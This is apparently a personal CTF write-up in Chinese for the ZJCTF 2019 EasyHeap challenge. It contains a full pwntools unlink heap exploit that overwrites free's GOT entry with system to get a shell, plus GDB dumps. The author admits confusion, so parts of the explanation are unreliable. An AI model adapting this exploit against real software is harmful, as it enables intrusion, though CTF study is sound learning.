# [ZJCTF 2019]EasyHeap

[题目地址](https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap)

真的看不懂unlink，不知道脑子怎么了。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

看到堆我就没力气打了，真的对堆一窍不通，毫无夸张成分。程序本身很清晰。

```c
void main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_18 [8];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  do {
    while( true ) {
      while( true ) {
        menu();
        read(0,local_18,8);
        iVar1 = atoi(local_18);
        if (iVar1 != 3) break;
        delete_heap();
      }
      if (3 < iVar1) break;
      if (iVar1 == 1) {
        create_heap();
      }
      else if (iVar1 == 2) {
        edit_heap();
      }
      else {
LAB_00400d36:
        puts("Invalid Choice");
      }
    }
    if (iVar1 == 4) {
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    if (iVar1 != 0x1305) goto LAB_00400d36;
    if (magic < 0x1306) {
      puts("So sad !");
    }
    else {
      puts("Congrt !");
      l33t();
    }
  } while( true );
}
```

直接步入重点漏洞函数，别的没啥看的，反正不会。

```c
void edit_heap(void)

{
  int iVar1;
  int iVar2;
  long in_FS_OFFSET;
  char local_18 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index :");
  read(0,local_18,4);
  iVar1 = atoi(local_18);
  if ((iVar1 < 0) || (9 < iVar1)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(long *)(heaparray + (long)iVar1 * 8) == 0) {
    puts("No such heap !");
  }
  else {
    printf("Size of Heap : ");
    read(0,local_18,8);
    iVar2 = atoi(local_18);
    printf("Content of heap : ");
    read_input(*(undefined8 *)(heaparray + (long)iVar1 * 8),(long)iVar2);
    puts("Done !");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

又是经典毛病，随意输入导致堆溢出。这种题跟栈类比相当于程序里使用了gets函数，确实baby，可惜我的智商tm是负数。有两种方法，house of spirit和unlink。跟着[大佬](https://blog.csdn.net/weixin_45677731/article/details/108204244)选了unlink,之前已经学过一遍了，果不其然还是没懂。先放wp。

```python
from pwn import *
sh=remote("node4.buuoj.cn",25613)
free_got=0x00602018
system_plt=0x00400700
context.log_level='debug'
ptr=0x6020e8
def add(size,content):
    sh.recvuntil("Your choice :")
    sh.sendline('1')
    sh.recvuntil("Size of Heap : ")
    sh.sendline(str(size))
    sh.recvuntil("Content of heap:")
    sh.sendline(content)

def edit(idx, size, content):
    sh.recvuntil("Your choice :")
    sh.sendline('2')
    sh.recvuntil("Index :")
    sh.sendline(str(idx))
    sh.recvuntil("Size of Heap : ")
    sh.sendline(str(size))
    sh.recvuntil("Content of heap : ")
    sh.sendline(content)

def delete(idx):
    sh.recvuntil("Your choice :")
    sh.sendline('3')
    sh.recvuntil("Index :")
    sh.sendline(str(idx))

add(0x100,'aaaa')
add(0x20,'bbbb')
add(0x80,'cccc')

payload=p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)
payload+=p64(0x20)+p64(0x90)
edit(1,len(payload),payload)

delete(2)

payload=p64(0)+p64(0)+p64(free_got)
payload+=p64(ptr-0x18)+p64(ptr+0x10)+b"/bin/sh"
edit(1,len(payload),payload)
edit(0,8,p64(system_plt))
delete(2)
sh.interactive()
```

先add几个堆块，按照索引命名，chunk0-2。chunk0用来实际改free got表，chunk1为unlink制造条件，chunk2实施unlink。第一个payload主要是在chunk1中构造一个假chunk，这个chunk卡在原chunk1的数据域，p64(0)+p64(0x21)伪装prev_size和size，p64(ptr-0x18)+p64(ptr-0x10)伪装fd和bk，因为这里假装的是一个空闲chunk，数据域在空闲时就是fd和bk。p64(0x20)+p64(0x90)这段溢出到chunk2的prev_size和size域。0x20是因为刚刚伪造的那个chunk就这么大；0x90是自己的大小，同时由于低位是0，表示前一个伪装的chunk为free状态。我们把一切布置得以假乱真，系统就会相信那个伪装的chunk真的存在，状态是free。

delete（2）触发unlink，就会让chunk2和伪装chunk合并在一起，看[ctf wiki](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#_3)说效果是把ptr指向的地址改为ptr-0x18。ptr是0x6020e8，那现在ptr就指向了0x6020d0。接下来我就不懂了。理论上现在0x6020e8（heaparray中指向chunk1的地址）应该指向0x6020d0，那编辑chunk1时就是编辑0x6020d0。做了个调试，里面长这样：

```
(gdb) $ x/16g 0x006020d0
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0 <heaparray>:    0x0000000000bad2a0    0x0000000000bad3b0
0x6020f0 <heaparray+16>:    0x0000000000000000    0x0000000000000000
0x602100 <heaparray+32>:    0x0000000000000000    0x0000000000000000
0x602110 <heaparray+48>:    0x0000000000000000    0x0000000000000000
0x602120 <heaparray+64>:    0x0000000000000000    0x0000000000000000
```

最开始觉得p64(0)+p64(0)+p64(free_got)正好覆盖到0x6020e0，把chunk0在heaparray中的地址改为free_got。然而后面那些东西就看不出来了，应该不是这样搞的。后来再想想，难道不是让0x6020e8指向0x6020d0，而是让0x6020e8指向的东西指向0x6020d0？感觉也不对，因为后面调试输入的a还在原chunk里。

```
(gdb) $  x/16g 0x006020d0
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0 <heaparray>:    0x0000000000bad2a0    0x0000000000bad3b0
0x6020f0 <heaparray+16>:    0x0000000000000000    0x0000000000000000
0x602100 <heaparray+32>:    0x0000000000000000    0x0000000000000000
0x602110 <heaparray+48>:    0x0000000000000000    0x0000000000000000
0x602120 <heaparray+64>:    0x0000000000000000    0x0000000000000000
0x602130:    0x0000000000000000    0x0000000000000000
0x602140:    0x0000000000000000    0x0000000000000000
(gdb) $ x/16x  0x0000000000bad3b0
0xbad3b0:    0x0000000a61616161    0x0000000000000021
0xbad3c0:    0x00000000006020d0    0x00000000006020d8
0xbad3d0:    0x0000000000000020    0x0000000000000090
0xbad3e0:    0x0000000000000bad    0xf21694923c78a8a0
0xbad3f0:    0x0000000000000000    0x0000000000000000
```

这个是我在第一个delete后下了断点，然后自己调用edit输入一些a得到的。确实能看到那个假的小堆块，但是为什么输入的a还是在这？套进原payload也看不懂，麻了。难道断点断错了？不懂，等我继续积累别的题再说吧。另一种方法乍一看比这个复杂，但似乎比这个好理解多了。